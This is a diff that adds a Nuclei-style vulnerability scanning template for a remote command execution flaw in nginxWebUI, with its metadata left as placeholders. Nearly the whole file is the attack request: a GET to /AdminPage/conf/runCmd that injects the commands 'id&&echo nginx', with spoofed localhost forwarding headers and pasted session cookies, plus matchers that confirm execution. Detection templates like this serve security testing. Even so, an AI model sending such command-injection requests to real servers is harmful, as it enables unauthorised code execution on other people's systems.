@@ -1,0 +1,37 @@
+id: nginxWebUi-rce
+
+info:
+  name: Template Name
+  author: biubiu
+  severity: info
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+requests:
+  - raw:
+      - |
+        GET /AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: SOLONID=7a33c4e0262f44f1a29bf58ad1b90b1d; SOLONID2=4b1613def461db1e8f4eea91f4855e8e; Hm_lvt_8acef669ea66f479854ecd328d1f348f=1688069764; Hm_lpvt_8acef669ea66f479854ecd328d1f348f=1688069764
+        Upgrade-Insecure-Requests: 1
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - nginx
+      - type: status
+        status:
+          - 200
